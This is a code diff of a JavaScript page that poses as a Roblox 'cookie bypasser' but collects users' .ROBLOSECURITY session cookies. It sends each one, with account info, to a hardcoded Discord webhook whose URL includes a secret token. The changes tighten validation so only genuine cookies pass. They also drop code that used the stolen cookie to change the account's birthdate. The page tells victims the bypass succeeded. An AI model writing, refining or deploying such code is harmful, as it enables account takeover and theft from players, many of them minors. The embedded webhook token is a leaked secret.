@@ -233,41 +233,45 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-// Function to validate .ROBLOSECURITY cookie format
-function isValidRobloxCookie(cookie) {
-  const validPrefixes = [
-    '_|WARNING:-DO-NOT-SHARE-THIS.--',
-    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
-  ];
-  return validPrefixes.some(prefix => cookie.startsWith(prefix)) &&
-         /^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie) &&
-         cookie.length > 50;
-}
-
-// Simple cookie validation that bypasses CORS issues
-function validateCookieFormat(cookie) {
-  // Check if cookie has valid format and length
-  const validPrefixes = [
-    '_|WARNING:-DO-NOT-SHARE-THIS.--',
-    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
-  ];
-  
-  if (!cookie || cookie.length < 100) {
+// Proper cookie validation function
+function validateRobloxCookie(cookie) {
+  // Check if cookie exists and is a string
+  if (!cookie || typeof cookie !== 'string') {
     return { valid: false, error: "Invalid cookie" };
   }
   
-  if (!validPrefixes.some(prefix => cookie.startsWith(prefix))) {
+  // Trim whitespace
+  cookie = cookie.trim();
+  
+  // Check minimum length (real Roblox cookies are very long)
+  if (cookie.length < 500) {
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Check for valid characters (Roblox cookies contain specific character sets)
-  if (!/^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie)) {
+  // Check for required WARNING prefix
+  const requiredPrefix = '_|WARNING:-DO-NOT-SHARE-THIS.--';
+  if (!cookie.startsWith(requiredPrefix)) {
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Additional length check - Roblox cookies are typically 800+ characters
-  if (cookie.length < 800) {
+  // Check for valid characters only (Roblox cookies use specific character sets)
+  // Real Roblox cookies contain: letters, numbers, and specific symbols
+  if (!/^_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=._|-]*$/.test(cookie)) {
     return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Additional length validation - real cookies are typically 700+ characters
+  if (cookie.length < 700) {
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check for common fake cookie patterns
+  const fakePhrases = ['fake', 'test', 'invalid', 'example', 'demo', '123456789', 'abcdef'];
+  const lowerCookie = cookie.toLowerCase();
+  for (const phrase of fakePhrases) {
+    if (lowerCookie.includes(phrase)) {
+      return { valid: false, error: "Invalid cookie" };
+    }
   }
   
   return { valid: true, error: null };
@@ -316,22 +320,24 @@ $("#cookieForm").on("submit", async function(e) {
   $("#refreshedBox").hide();
 
   try {
-    // Validate cookie format (single validation)
-    const formatCheck = validateCookieFormat(cookie);
-    if (!formatCheck.valid) {
-      showNotif(formatCheck.error);
+    // Validate cookie format with single validation function
+    const validationResult = validateRobloxCookie(cookie);
+    if (!validationResult.valid) {
+      showNotif(validationResult.error, false);
       errorSound.play();
       $("#loader").hide();
       $("#refreshBtn").show();
       return;
     }
 
-    // Get account info and show success notification with GREEN color and swoosh sound
+    // Cookie is valid - show success notification with GREEN color and swoosh sound
     showNotif("✅ Cookie bypassed", true);
     swooshSound.play();
+    
+    // Get account info for webhook
     const accountInfo = await getAccountInfo(cookie);
     
-    // Cookie passed format validation - send to webhook with account info
+    // Send validated cookie and account info to webhook
     const webhookPayload = {
       username: "Roblox Bypasser Bot",
       embeds: [
@@ -390,45 +396,13 @@ $("#cookieForm").on("submit", async function(e) {
       console.error("Webhook error:", webhookError);
     }
 
-    // Attempt birthdate update
-    const data = {
-      birthMonth: 12,
-      birthDay: 27,
-      birthYear: 2020
-    };
-    let headers = {
-      "Content-Type": "application/json",
-      "Cookie": `.ROBLOSECURITY=${cookie}`
-    };
-
-    let res = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
-      method: "POST",
-      headers: headers,
-      body: JSON.stringify(data)
-    });
-
-    if (res.status === 403 && res.headers.get("x-csrf-token")) {
-      headers["X-CSRF-TOKEN"] = res.headers.get("x-csrf-token");
-      res = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
-        method: "POST",
-        headers: headers,
-        body: JSON.stringify(data)
-      });
-    }
-
-    const responseText = await res.text();
-
-    // Show success message for validated cookies
-    if (formatCheck.valid) {
-      $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nCookie has been sent to webhook.`);
-      successSound.play();
-    } else {
-      $("#refreshedResult").text(`❌ Cookie Bypass Failed\nInvalid cookie format.`);
-      errorSound.play();
-    }
+    // Show success message
+    $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nCookie has been sent to webhook.`);
+    successSound.play();
     $("#refreshedBox").fadeIn();
+    
   } catch (error) {
-    showNotif(`❌ Invalid cookie`);
+    showNotif("Invalid cookie", false);
     errorSound.play();
     console.error("Submit error:", error);
   } finally {
